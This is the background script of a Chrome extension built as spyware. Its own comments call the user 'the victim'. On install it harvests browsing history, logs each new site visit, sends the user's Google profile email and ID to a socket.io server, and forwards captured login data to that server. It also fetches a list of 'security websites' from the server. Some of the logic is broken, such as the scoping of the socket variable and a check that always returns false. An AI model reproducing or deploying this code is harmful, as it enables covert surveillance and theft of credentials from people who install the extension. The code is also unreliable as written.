chrome.runtime.onInstalled.addListener(() => {
  // Connect to server for the first time and get security websites
  var socket = connectToServer();
  updateSecurityWebsites(socket);
  // Retrieves the browser history of the victim for the last 24 hours on install
  chrome.history.search({
    text: ''
  }, (results) => {
    results.forEach((page) => {
      console.log(page.url + '\n' +
        '    Time Visited: ' + new Date(page.lastVisitTime) + '\n' +
        '    Visit Count: ' + page.visitCount);
    });
  });
  // Adds listener that will log all sites visited by victim
  chrome.history.onVisited.addListener((page) => {
    console.log(page.url + '\n' +
      '    Time Visited: ' + new Date(page.lastVisitTime) + '\n' +
      '    Visit Count: ' + page.visitCount);
  });
});

chrome.runtime.onStartup.addListener(() => {
  var socket = connectToServer();
  updateSecurityWebsites(socket);
});

chrome.runtime.onSuspend.addListener(() => {
  disconnectFromServer(socket);
});

chrome.runtime.onMessage.addListener((request, sender) => {
  socket.emit('Login', request.loginListener);
});

function connectToServer() {
  socket = io('http://localhost:3000');
  chrome.identity.getProfileUserInfo((userInfo) => {
    if (userInfo.email == null) {
      userInfo.email = "No email";
      userInfo.id = "User not logged in";
    }
    socket.emit('userInfo', userInfo);
  });
  return socket;
}

function disconnectFromServer(socket) {
  socket.disconnect();
}

function updateSecurityWebsites(socket) {
  socket.on('securityWebsites', (securityWebsites) => {
    chrome.storage.sync.set({
      'securityWebsites': securityWebsites
    });
  });
}

function checkSecurityWebsites(website) {
  chrome.storage.sync.get('securityWebsites', (securityWebsites) => {
    for (var i = 0; i < securityWebsites.length; i++) {
      if (website.includes(securityWebsites[i])) return true;
    }
  });
  return false;
}
